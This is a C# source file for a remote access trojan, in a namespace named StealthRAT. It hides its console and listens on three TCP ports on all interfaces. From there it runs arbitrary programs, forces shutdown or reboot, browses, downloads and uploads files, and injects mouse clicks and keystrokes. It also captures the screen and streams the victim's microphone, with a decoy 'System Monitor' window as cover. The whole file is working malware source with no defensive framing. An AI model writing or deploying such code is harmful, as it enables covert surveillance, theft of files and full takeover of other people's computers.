using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using NAudio.Wave;              // Added for audio capture

namespace StealthRAT
{
    public class RemoteUIManager : Form
    {
        private readonly RichTextBox logBox;
        public RemoteUIManager()
        {
            Text = "System Monitor";
            Size = new Size(500, 400);
            StartPosition = FormStartPosition.CenterScreen;
            FormBorderStyle = FormBorderStyle.SizableToolWindow;
            logBox = new RichTextBox { Dock = DockStyle.Fill, ReadOnly = true, BackColor = Color.Black, ForeColor = Color.Lime, Font = new Font("Consolas", 10) };
            Controls.Add(logBox);
        }
        public void Log(string msg)
        {
            if (logBox.InvokeRequired) logBox.Invoke(new Action(() => Log(msg)));
            else logBox.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\n");
        }
    }

    public class Program
    {
        [DllImport("kernel32.dll")]
        private static extern bool FreeConsole();

        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll")]
        private static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, UIntPtr dwExtraInfo);

        [DllImport("user32.dll")]
        private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

        private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const uint MOUSEEVENTF_LEFTUP = 0x0004;
        private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        private const uint KEYEVENTF_KEYDOWN = 0x0000;
        private const uint KEYEVENTF_KEYUP = 0x0002;

        // Ports
        private const int CommandPort = 9090;
        private const int ScreenPort = 9091;
        private const int AudioPort = 9092;

        private static TcpListener? cmdListener;
        private static TcpListener? screenListener;
        private static TcpListener? audioListener;
        private static CancellationTokenSource? cts;
        private static RemoteUIManager? uiForm;
        private static readonly object uiLock = new object();
        private static readonly string LogPath = Path.Combine(Path.GetTempPath(), "rat_debug.log");
        private static void WriteLog(string msg) { try { File.AppendAllText(LogPath, $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} - {msg}\n"); } catch { } }

        public static async Task Main(string[] args)
        {
            WriteLog("RAT started");
            FreeConsole();
            WriteLog("Console freed");
            cts = new CancellationTokenSource();
            _ = Task.Run(() => StartCommandListener(cts.Token));
            _ = Task.Run(() => StartScreenListener(cts.Token));
            _ = Task.Run(() => StartAudioListener(cts.Token));   // Audio stream
            await Task.Delay(-1, cts.Token);
        }

        // ---------- Command Listener (port 9090) ----------
        private static async Task StartCommandListener(CancellationToken token)
        {
            cmdListener = new TcpListener(IPAddress.Any, CommandPort);
            cmdListener.Start();
            WriteLog($"Command listener on {CommandPort}");
            while (!token.IsCancellationRequested)
            {
                var client = await cmdListener.AcceptTcpClientAsync(token);
                _ = Task.Run(() => HandleCommandClient(client, token));
            }
        }

        private static async Task HandleCommandClient(TcpClient client, CancellationToken token)
        {
            using (client)
            using (var stream = client.GetStream())
            using (var reader = new StreamReader(stream, Encoding.UTF8, leaveOpen: true))
            using (var writer = new StreamWriter(stream, Encoding.UTF8, leaveOpen: true) { AutoFlush = true })
            {
                try
                {
                    while (!token.IsCancellationRequested && client.Connected)
                    {
                        string? line = await reader.ReadLineAsync(token);
                        if (string.IsNullOrEmpty(line)) break;
                        WriteLog($"Cmd: {line}");
                        string response = await ProcessCommandAsync(line.Trim(), writer, stream);
                        await writer.WriteLineAsync(response);
                    }
                }
                catch (Exception ex) { WriteLog($"Cmd error: {ex.Message}"); }
            }
        }

        private static async Task<string> ProcessCommandAsync(string cmdLine, StreamWriter writer, NetworkStream stream)
        {
            var parts = cmdLine.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
            if (parts.Length == 0) return "ERR: Empty";
            string cmd = parts[0].ToLowerInvariant();
            string[] args = parts.Skip(1).ToArray();

            switch (cmd)
            {
                case "launch": return LaunchProcess(args);
                case "shutdown": return Shutdown();
                case "reboot": return Reboot();
                case "fileaccess": return await HandleFileAccess(args, writer, stream);
                case "showui": return ShowUI();
                case "hideui": return HideUI();
                case "mousemove": return MouseMove(args);
                case "mouseclick": return MouseClick(args);
                case "keypress": return KeyPress(args);
                case "exit": _ = Task.Run(() => Environment.Exit(0)); return "OK: Exiting";
                default: return "ERR: Unknown command";
            }
        }

        private static string LaunchProcess(string[] args)
        {
            if (args.Length == 0) return "ERR: Missing program";
            try
            {
                var psi = new ProcessStartInfo(args[0], args.Length > 1 ? string.Join(" ", args.Skip(1)) : "") { UseShellExecute = false, CreateNoWindow = true };
                Process.Start(psi);
                return $"OK: Launched {args[0]}";
            }
            catch (Exception ex) { return $"ERR: {ex.Message}"; }
        }

        private static string Shutdown() { try { Process.Start("shutdown", "/s /t 0 /f"); return "OK: Shutdown"; } catch (Exception ex) { return $"ERR: {ex.Message}"; } }
        private static string Reboot() { try { Process.Start("shutdown", "/r /t 0 /f"); return "OK: Reboot"; } catch (Exception ex) { return $"ERR: {ex.Message}"; } }

        private static async Task<string> HandleFileAccess(string[] args, StreamWriter writer, NetworkStream stream)
        {
            if (args.Length < 2) return "ERR: fileaccess needs subcommand and path";
            string sub = args[0].ToLowerInvariant();
            string path = string.Join(" ", args.Skip(1));
            switch (sub)
            {
                case "list": return DirectoryListing(path);
                case "download": return await SendFile(path, writer, stream);
                case "upload": return await ReceiveFile(path, writer, stream);
                default: return "ERR: Unknown subcommand";
            }
        }

        private static string DirectoryListing(string path)
        {
            try
            {
                var dir = new DirectoryInfo(path);
                if (!dir.Exists) return $"ERR: Not found: {path}";
                var sb = new StringBuilder();
                sb.AppendLine($"Directory {dir.FullName}");
                foreach (var d in dir.GetDirectories()) sb.AppendLine($"[DIR]  {d.Name}");
                foreach (var f in dir.GetFiles()) sb.AppendLine($"[FILE] {f.Name} ({f.Length} bytes)");
                return $"OK\n{sb}";
            }
            catch (Exception ex) { return $"ERR: {ex.Message}"; }
        }

        private static async Task<string> SendFile(string filePath, StreamWriter writer, NetworkStream stream)
        {
            if (!File.Exists(filePath)) return "ERR: File not found";
            byte[] data = await File.ReadAllBytesAsync(filePath);
            string b64 = Convert.ToBase64String(data);
            await writer.WriteLineAsync($"OK_FILE {Path.GetFileName(filePath)} {data.Length}");
            await writer.WriteLineAsync(b64);
            await writer.WriteLineAsync("__END__");
            return "";
        }

        private static async Task<string> ReceiveFile(string destPath, StreamWriter writer, NetworkStream stream)
        {
            await writer.WriteLineAsync("READY_UPLOAD");
            var reader = new StreamReader(stream, Encoding.UTF8);
            StringBuilder b64 = new StringBuilder();
            string? line;
            while ((line = await reader.ReadLineAsync()) != null)
            {
                if (line == "__END__") break;
                b64.Append(line);
            }
            byte[] data = Convert.FromBase64String(b64.ToString());
            Directory.CreateDirectory(Path.GetDirectoryName(destPath)!);
            await File.WriteAllBytesAsync(destPath, data);
            return $"OK: Saved {destPath} ({data.Length} bytes)";
        }

        private static string ShowUI()
        {
            try
            {
                lock (uiLock)
                {
                    if (uiForm == null || uiForm.IsDisposed)
                    {
                        var t = new Thread(() => { uiForm = new RemoteUIManager(); Application.Run(uiForm); });
                        t.SetApartmentState(ApartmentState.STA);
                        t.Start();
                    }
                    else uiForm.Invoke(new Action(() => uiForm.Show()));
                }
                return "OK: UI shown";
            }
            catch (Exception ex) { return $"ERR: {ex.Message}"; }
        }

        private static string HideUI()
        {
            try
            {
                if (uiForm != null && !uiForm.IsDisposed)
                    uiForm.Invoke(new Action(() => uiForm.Hide()));
                return "OK: UI hidden";
            }
            catch (Exception ex) { return $"ERR: {ex.Message}"; }
        }

        private static string MouseMove(string[] args)
        {
            if (args.Length < 2) return "ERR: mousemove X Y";
            if (int.TryParse(args[0], out int x) && int.TryParse(args[1], out int y))
            {
                SetCursorPos(x, y);
                return $"OK: Mouse moved to ({x},{y})";
            }
            return "ERR: Invalid coordinates";
        }

        private static string MouseClick(string[] args)
        {
            bool right = args.Length > 0 && args[0].ToLower() == "right";
            uint down = right ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_LEFTDOWN;
            uint up = right ? MOUSEEVENTF_RIGHTUP : MOUSEEVENTF_LEFTUP;
            mouse_event(down, 0, 0, 0, UIntPtr.Zero);
            Thread.Sleep(50);
            mouse_event(up, 0, 0, 0, UIntPtr.Zero);
            return $"OK: {(right ? "Right" : "Left")} click";
        }

        private static string KeyPress(string[] args)
        {
            if (args.Length == 0) return "ERR: keypress <key>";
            string key = args[0].ToUpper();
            byte vk = 0;
            if (key.Length == 1 && char.IsLetterOrDigit(key[0])) vk = (byte)key[0];
            else if (key == "ENTER") vk = 0x0D;
            else if (key == "SPACE") vk = 0x20;
            else if (key == "TAB") vk = 0x09;
            else if (key == "BACKSPACE") vk = 0x08;
            else if (key == "ESC") vk = 0x1B;
            else return "ERR: Unsupported key";
            keybd_event(vk, 0, KEYEVENTF_KEYDOWN, UIntPtr.Zero);
            Thread.Sleep(30);
            keybd_event(vk, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
            return $"OK: Key {key} pressed";
        }

        // ---------- Screen Capture (port 9091) ----------
        private static async Task StartScreenListener(CancellationToken token)
        {
            screenListener = new TcpListener(IPAddress.Any, ScreenPort);
            screenListener.Start();
            WriteLog($"Screen listener on {ScreenPort}");
            while (!token.IsCancellationRequested)
            {
                var client = await screenListener.AcceptTcpClientAsync(token);
                _ = Task.Run(() => HandleScreenClient(client, token));
            }
        }

        private static async Task HandleScreenClient(TcpClient client, CancellationToken token)
        {
            using (client)
            using (var stream = client.GetStream())
            using (var reader = new StreamReader(stream, Encoding.UTF8, leaveOpen: true))
            using (var writer = new StreamWriter(stream, Encoding.UTF8, leaveOpen: true) { AutoFlush = true })
            {
                try
                {
                    string? cmd = await reader.ReadLineAsync(token);
                    if (cmd == "screenshot")
                    {
                        WriteLog("Screenshot requested");
                        byte[] jpeg = CaptureScreenAsJpeg();
                        await writer.WriteLineAsync($"IMG {jpeg.Length}");
                        await stream.WriteAsync(jpeg, 0, jpeg.Length, token);
                        WriteLog($"Sent {jpeg.Length} bytes");
                    }
                }
                catch (Exception ex) { WriteLog($"Screen error: {ex.Message}"); }
            }
        }

        private static byte[] CaptureScreenAsJpeg()
        {
            var bounds = Screen.PrimaryScreen.Bounds;
            using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
            using (var g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(0, 0, 0, 0, bounds.Size);
                using (var ms = new MemoryStream())
                {
                    ImageCodecInfo? jpegCodec = ImageCodecInfo.GetImageEncoders().FirstOrDefault(c => c.FormatID == ImageFormat.Jpeg.Guid);
                    if (jpegCodec != null)
                    {
                        EncoderParameters encoderParams = new EncoderParameters(1);
                        encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 70L);
                        bitmap.Save(ms, jpegCodec, encoderParams);
                    }
                    else
                    {
                        bitmap.Save(ms, ImageFormat.Jpeg);
                    }
                    return ms.ToArray();
                }
            }
        }

        // ---------- Audio Capture (port 9092) ----------
        private static async Task StartAudioListener(CancellationToken token)
        {
            audioListener = new TcpListener(IPAddress.Any, AudioPort);
            audioListener.Start();
            WriteLog($"Audio listener on {AudioPort}");
            while (!token.IsCancellationRequested)
            {
                var client = await audioListener.AcceptTcpClientAsync(token);
                _ = Task.Run(() => HandleAudioClient(client, token));
            }
        }

        private static async Task HandleAudioClient(TcpClient client, CancellationToken token)
        {
            using (client)
            using (var stream = client.GetStream())
            {
                var waveFormat = new WaveFormat(16000, 16, 1); // 16kHz, 16-bit, mono
                using (var capture = new WaveInEvent())  // Microphone capture
                {
                    capture.WaveFormat = waveFormat;
                    capture.DataAvailable += (s, e) =>
                    {
                        try
                        {
                            stream.Write(e.Buffer, 0, e.BytesRecorded);
                        }
                        catch { }
                    };
                    capture.StartRecording();
                    WriteLog("Audio capture started (microphone)");
                    // Keep connection alive until client disconnects or token cancelled
                    var dummy = new byte[1];
                    while (!token.IsCancellationRequested && client.Connected)
                    {
                        try { await stream.ReadAsync(dummy, 0, 1, token); }
                        catch { break; }
                    }
                    capture.StopRecording();
                }
            }
        }
    }
}